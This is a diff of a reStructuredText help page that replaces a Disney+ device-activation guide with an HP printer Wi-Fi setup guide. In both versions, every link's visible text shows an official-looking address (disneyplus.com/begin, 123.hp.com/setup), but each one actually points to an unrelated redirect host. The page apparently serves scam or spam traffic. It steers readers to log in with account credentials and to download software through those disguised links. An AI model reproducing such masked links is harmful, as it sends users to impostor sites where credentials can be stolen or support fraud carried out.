@@ -1,5 +1,5 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How Do I Connect My HP 123 Printer to Wi-Fi?
 ##################
 
 .. meta::
@@ -14,35 +14,42 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: 123.hp.com/setup
+   :target: https://hs.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Connecting your HP printer to Wi-Fi ensures smooth wireless printing from multiple devices. You can easily set up the wireless connection by visiting `123.hp.com/setup <https://hs.redircoms.com>`_ and following the official steps to configure your HP 123 printer.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Connect HP 123 Printer to Wi-Fi
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Power on your HP printer and make sure it’s in **Ready** mode.
+2. On the printer control panel, go to **Wireless Settings** and select **Wi-Fi Setup Wizard**.
+3. The printer will search for available wireless networks.
+4. Select your Wi-Fi network (SSID) from the list.
+5. Enter your **Wi-Fi password** using the printer keypad or touchscreen, then confirm.
+6. Once connected, the wireless light on the printer will remain steady.
 
 **********
-What to Do After Activation
+Use 123.hp.com/setup for Complete Configuration
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+1. Open a browser and go to `123.hp.com/setup <https://hs.redircoms.com>`_.
+2. Enter your printer model to download the latest driver and HP Smart app.
+3. Install the software on your computer or mobile device.
+4. Follow the on-screen instructions to add the printer to your device over Wi-Fi.
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Post-Setup Tips
+**********
+
+- Ensure your printer and device are on the same wireless network.
+- Restart router or printer if Wi-Fi connection fails initially.
+- Use the **HP Smart App** for mobile printing and scanning features.
+
+For a reliable wireless setup experience, visit `123.hp.com/setup <https://hs.redircoms.com>`_ and connect your HP printer to Wi-Fi with ease.
